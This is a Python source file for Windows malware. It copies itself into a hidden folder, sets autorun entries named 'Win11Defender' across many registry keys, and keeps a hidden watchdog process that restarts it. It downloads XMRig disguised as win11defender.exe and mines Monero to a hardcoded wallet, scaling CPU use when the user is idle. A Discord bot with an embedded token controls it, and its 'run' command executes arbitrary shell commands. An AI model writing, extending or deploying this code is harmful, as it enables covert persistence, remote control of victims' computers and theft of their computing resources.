import requests, subprocess, os, time, sys, winreg, shutil, json, zipfile, io, platform, threading, ctypes
from ctypes import windll, wintypes
try:
    import discord
except:
    subprocess.run([sys.executable,"-m","pip","install","discord.py"],creationflags=subprocess.CREATE_NO_WINDOW,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
import discord
from discord import app_commands

ad=windll.shell32.IsUserAnAdmin()!=0
b=winreg.HKEY_LOCAL_MACHINE if ad else winreg.HKEY_CURRENT_USER
s=sys.executable if getattr(sys,'frozen',False) else __file__
hd=os.path.join(os.getenv('APPDATA'),'Microsoft','Windows','Caches')
d=os.path.join(hd,'system_bot.py')
os.makedirs(hd,exist_ok=True)
shutil.copy2(s,d)
os.system(f'attrib +h "{hd}"')

ck=[
(b,r'Software\Microsoft\Windows\CurrentVersion\Run'),
(b,r'Software\Microsoft\Windows\CurrentVersion\RunOnce'),
(b,r'Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run'),
(b,r'Software\Microsoft\Windows NT\CurrentVersion\Windows','Load'),
(b,r'Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved'),
(b,r'Software\Microsoft\Windows\CurrentVersion\Command Processor','AutoRun'),
(b,r'Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders','Startup'),
(b,r'Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders','Startup'),
(b,r'Software\Policies\Microsoft\Windows\System\Scripts\Startup'),
(b,r'Software\Microsoft\Windows\CurrentVersion\RunServices'),
(b,r'Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'),
(b,r'Software\Microsoft\Windows\CurrentVersion\RunOnceEx'),
(b,r'Software\Microsoft\Windows\CurrentVersion\RunExt'),
(b,r'Software\Microsoft\Windows\CurrentVersion\OptimalMax'),
(b,r'Software\Microsoft\Windows\CurrentVersion\App Paths'),
(b,r'Software\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\Background'),
(b,r'Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run'),
(b,r'Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run32'),
(b,r'Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder'),
(b,r'Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'),
]
ek=[]

def rg():
    for e in ck+ek:
        try:
            if len(e)==2:
                hk,sk=e; vn='Win11Defender'
            else:
                hk,sk,vn=e
            h=winreg.CreateKey(hk,sk)
            winreg.SetValueEx(h,vn,0,winreg.REG_SZ,f'"{sys.executable}" "{d}"')
            winreg.CloseKey(h)
        except: pass
rg()

def wd():
    import psutil
    for p in psutil.process_iter(['pid','cmdline']):
        try:
            if p.info['cmdline'] and '--watch' in ' '.join(p.info['cmdline']):
                return
        except: pass
    subprocess.Popen([sys.executable,d,'--watch'],creationflags=subprocess.CREATE_NO_WINDOW)

if '--watch' not in sys.argv:
    wd()

Oxh="MTUyNTE5MTQ1ODEzMzUwODI5Nw.GfcOtp.zCGG9d65-F8Evt-j3nMxxPd_Vde41t-P95GEVA"
c=discord.Client(intents=discord.Intents.default())
t=app_commands.CommandTree(c)

xm_dir=os.path.join(hd,'xmg')
xm_exe=os.path.join(xm_dir,'win11defender.exe')
xm_cfg=os.path.join(xm_dir,'config.json')
mp=None
mt=0
dflt_wallet="45qkazqu1dETh4Zc2uK4147ztkdY6w4UJAFPk1bv2Za7dJb9QYDaAbWSx9GKSuwWNubTzM6uNtGLLZDjoJXy8SrV1cxpvDK"
dflt_pool="pool.supportxmr.com:3333"
idle_thresh=300
start_time=time.time()

def gi():
    class LASTINPUTINFO(ctypes.Structure):
        _fields_=[('cbSize',wintypes.UINT),('dwTime',wintypes.DWORD)]
    l=LASTINPUTINFO()
    l.cbSize=ctypes.sizeof(LASTINPUTINFO)
    if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(l)):
        return (ctypes.windll.kernel32.GetTickCount()-l.dwTime)//1000
    return 0

def dl_xm():
    if os.path.exists(xm_exe): return
    os.makedirs(xm_dir,exist_ok=True)
    url="https://api.github.com/repos/xmrig/xmrig/releases/latest"
    r=requests.get(url, timeout=30)
    r.raise_for_status()
    data=r.json()
    for a in data['assets']:
        if 'win' in a['name'].lower() and a['name'].endswith('.zip'):
            zurl=a['browser_download_url']
            break
    else:
        raise Exception("No Windows zip found")
    z=requests.get(zurl, timeout=120)
    z.raise_for_status()
    with zipfile.ZipFile(io.BytesIO(z.content)) as zf:
        zf.extractall(xm_dir)
    for root,dirs,files in os.walk(xm_dir):
        for f in files:
            if f.lower()=='win11defender.exe':
                shutil.move(os.path.join(root,f),xm_exe)
                break
        if os.path.exists(xm_exe): break
    for f in os.listdir(xm_dir):
        p=os.path.join(xm_dir,f)
        if os.path.isdir(p) and p!=xm_dir:
            shutil.rmtree(p)

def mk_cfg(wallet,pool):
    cfg={
        "autosave":True,
        "cpu":{"enabled":True,"huge-pages":True,"huge-pages-jit":False},
        "pools":[{"url":pool,"user":wallet,"tls":False}],
        "print-time":60,
        "randomx":{"1gb-pages":False,"rdmsr":True,"wrmsr":True,"cache_qos":False,"numa":True,"scratchpad_prefetch_mode":1},
        "threads":0
    }
    with open(xm_cfg,'w') as f:
        json.dump(cfg,f,indent=2)

def cp():
    return os.cpu_count() or 1

def calct(idle):
    if idle>idle_thresh:
        return cp()
    else:
        return max(1,int(cp()*0.25))

def sm(th):
    global mp,mt
    if mp and mp.poll() is None:
        if mt==th:
            return
        mp.terminate()
        mp.wait()
    if not os.path.exists(xm_exe):
        dl_xm()
    if not os.path.exists(xm_cfg):
        mk_cfg(dflt_wallet,dflt_pool)
    with open(xm_cfg,'r') as f:
        cfg=json.load(f)
    cfg['threads']=th
    with open(xm_cfg,'w') as f:
        json.dump(cfg,f,indent=2)
    mp=subprocess.Popen([xm_exe,'--config='+xm_cfg],creationflags=subprocess.CREATE_NO_WINDOW)
    mt=th

def stopm():
    global mp,mt
    if mp and mp.poll() is None:
        mp.terminate()
        mp.wait()
    mp=None
    mt=0

@t.command(name="mine",description="Start mining (optional wallet)")
@app_commands.describe(wallet="Monero wallet address")
async def mine(i:discord.Interaction, wallet:str=None):
    await i.response.defer()
    try:
        if wallet:
            mk_cfg(wallet,dflt_pool)
        else:
            if not os.path.exists(xm_cfg):
                mk_cfg(dflt_wallet,dflt_pool)
        idle=gi()
        th=calct(idle)
        sm(th)
        await i.followup.send(f"Mining started with {th} threads (idle={idle}s)")
    except Exception as e:
        await i.followup.send(f"Error: {e}")

@t.command(name="stopmine",description="Stop mining")
async def stopmine(i:discord.Interaction):
    await i.response.defer()
    try:
        stopm()
        await i.followup.send("Mining stopped")
    except Exception as e:
        await i.followup.send(f"Error: {e}")

@t.command(name="run",description="Run a command")
@app_commands.describe(command="Command to run")
async def rn(i: discord.Interaction, cmd: str):
    await i.response.defer()
    try:
        r=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=30)
        o=r.stdout or r.stderr or "No output"
        for j in range(0,len(o),1900):
            await i.followup.send(f"```{o[j:j+1900]}```")
    except Exception as e:
        await i.followup.send(f"Error: `{e}`")

@t.command(name="status",description="Show miner, watchdog, and bot status")
async def st(i:discord.Interaction):
    await i.response.defer()
    try:
        lines=[]
        lines.append("**Miner:**")
        if os.path.exists(xm_exe):
            lines.append("- Executable: Deployed")
        else:
            lines.append("- Executable: Not found")
        if os.path.exists(xm_cfg):
            lines.append("- Config: Present")
        else:
            lines.append("- Config: Missing")
        if mp and mp.poll() is None:
            lines.append(f"- Process: Running (threads={mt})")
        else:
            lines.append("- Process: Stopped")
        lines.append("\n**Watchdog:**")
        import psutil
        wd_found=False
        for p in psutil.process_iter(['cmdline']):
            try:
                if p.info['cmdline'] and '--watch' in ' '.join(p.info['cmdline']):
                    wd_found=True
                    break
            except:
                pass
        if wd_found:
            lines.append("- Active: Yes")
        else:
            lines.append("- Active: No")
        lines.append("\n**Bot:**")
        lines.append(f"- Uptime: {int(time.time()-start_time)} seconds")
        lines.append(f"- PID: {os.getpid()}")
        await i.followup.send("\n".join(lines))
    except Exception as e:
        await i.followup.send(f"Error: {e}")

@c.event
async def on_ready():
    await t.sync()
    print(f"Bot ready as {c.user}")

if '--watch' in sys.argv:
    import psutil
    while True:
        time.sleep(300)
        try:
            pf=os.path.join(hd,'bot.pid')
            if os.path.exists(pf):
                with open(pf,'r') as f:
                    pid=int(f.read().strip())
                if not psutil.pid_exists(pid):
                    subprocess.Popen([sys.executable,d],creationflags=subprocess.CREATE_NO_WINDOW)
            idle=gi()
            th=calct(idle)
            if mp and mp.poll() is None:
                if mt!=th:
                    sm(th)
        except: pass
else:
    with open(os.path.join(hd,'bot.pid'),'w') as f:
        f.write(str(os.getpid()))
    c.run(Oxh)
